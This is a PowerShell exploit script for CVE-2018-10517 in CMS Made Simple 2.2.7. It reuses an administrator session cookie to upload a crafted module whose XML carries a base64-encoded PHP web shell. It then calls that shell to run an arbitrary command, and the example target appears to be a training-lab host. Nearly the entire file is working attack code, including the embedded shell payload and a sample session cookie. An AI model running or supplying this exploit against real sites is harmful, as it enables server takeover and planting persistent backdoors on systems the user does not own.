<#

.SYNOPSIS
This exploit script leverages Remote command execution in CMS Made Simple 2.2.7

.EXAMPLE
Executes "echo zc00l > /var/www/html/pwned.txt" on the remote server.
    
    Invoke-CVE-2018-10517 -URL "http://vtg251cbtepn9e3blg2a3vud1.public1.attackdefenselabs.com" -Cookie "CMSSESSID2543746e82b0=q30ra18tppht2cv5ge0abnill2; 9e64ffa8dbc0989a27514765a68a50028e0ed1f8=cc1dda892c8bc22818637503fb65f3549852e689%3A%3AeyJ1aWQiOjEsInVzZXJuYW1lIjoicGVudGVzdGVyIiwiZWZmX3VpZCI6bnVsbCwiZWZmX3VzZXJuYW1lIjpudWxsLCJoYXNoIjoiJDJ5JDEwJG42eVpRWnpXc2loVTZHRWZoenVnRWV2bTY4alwvSzV5ei5mNGg4anpJcWx0Y3o4U01NdXBlTyJ9; __c=a6dc9cdd74624799dba" -Command "echo zc00l > /var/www/html/pwned.txt"

#>
function Invoke-CVE-2018-10517
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$URL,

        [Parameter(Mandatory = $true, Position = 1)]
        [string]$Cookie,

        [Parameter(Mandatory = $true, Position = 2)]
        [string]$Command,

        [Parameter(Mandatory = $false, Position = 3)]
        [string]$ModuleName="exploit"
    )

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    # Splits cookie data by delimiter ;  (which is default in browsers)
    foreach($CookieData in $Cookie.Split(";"))
    {
        $TupleData = $CookieData.Split("=")
        if($TupleData.Length -le 1)
        {
            Write-Error "Invalid cookie detected."
            Continue
        }
        $CookieName = $TupleData[0].Replace(" ", "")
        $CookieValue = $TupleData[1]
        $CookieObj = New-Object System.Net.Cookie

        $CookieObj.Name = $CookieName
        $CookieObj.Value = $CookieValue
        $CookieObj.Domain = (Remove-Scheme $URL)
        $WebSession.Cookies.Add($CookieObj)
        Write-Output "Cookie $CookieName was added to session."
    }

    $Headers = @{
        "User-Agent" = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
        "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        "Accept-Language" = "en-US,en;q=0.5"
        "Accept-Encoding" = "gzip, deflate"
        "Referer" = "$URL"
        "Content-Type" = "multipart/form-data; boundary=---------------------------429786310683"
        "Upgrade-Insecure-Requests" = "1"
    }

    $Payload = @"
-----------------------------429786310683
Content-Disposition: form-data; name="mact"

ModuleManager,m1_,local_import,0
-----------------------------429786310683
Content-Disposition: form-data; name="__c"

a6dc9cdd74624799dba
-----------------------------429786310683
Content-Disposition: form-data; name="m1_upload"; filename="$ModuleName.xml"
Content-Type: text/xml

<module>
	<dtdversion>1.3</dtdversion>
	<name>AndreMarques</name>
	<version>1.0</version>
	<mincmsversion>1.11<mincmsversion>
<file>
	<filename>/</filename>
	<isdir>1</isdir>
</file>
<file>
	<filename>/$ModuleName.php</filename>
	<isdir>0</isdir>
	<data><![CDATA[PD9waHAgc2hlbGxfZXhlYygkX0dFVFtjXSk7Pz4=]]></data>
</file>
-----------------------------429786310683--
"@

    Write-Output "Trying to install exploit module over CMS Made Simple ..."
    $Response = Invoke-WebRequest -Method "POST" -URI "$URL/admin/moduleinterface.php" -WebSession $WebSession -Body $Payload -Headers $Headers
    if($Response.Content -Match "Module imported")
    {
        Write-Output "Exploit module has been uploaded and processed."
    } else {
        Write-Error "Exploit module has not been installed."
        return
    }

    Write-Output "Trying to trigger command execution ..."
    $StatusCode = (Invoke-WebRequest -Method "GET" -URI "$URL/modules/AndreMarques/$ModuleName.php?c=$Command").StatusCode
    if($StatusCode -eq 200)
    {
        Write-Output "Command has been executed."
    } else {
        Write-Error "Command has not been executed."
    }
    return
}
function Remove-Scheme
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$URI
    )
    if("https://" -match $URI)
    {
        return $URI.Replace("https://", "" )
    } else {
        return $URI.Replace("http://", "" )
    }
}